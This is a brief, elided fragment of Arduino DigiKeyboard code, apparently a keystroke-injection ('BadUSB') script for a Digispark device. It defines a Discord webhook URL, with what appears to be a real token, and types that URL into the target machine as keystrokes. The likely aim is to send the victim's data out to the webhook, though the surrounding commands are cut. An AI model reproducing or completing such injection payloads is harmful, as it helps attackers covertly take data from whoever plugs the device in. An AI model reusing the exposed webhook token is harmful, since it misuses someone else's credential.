...
String webhook_url = "https://discord.com/api/webhooks/1062792783187935373/F1rY5dzjH0mGrkO11IV-JJ_nCmTjueYMGoZj8aNXNuspLpO3yvYUsn21UBEdqh2HP8Tt/%22%22";
...
DigiKeyboard.println(")");
  DigiKeyboard.delay(1000);  
DigiKeyboard.println(webhook_url);
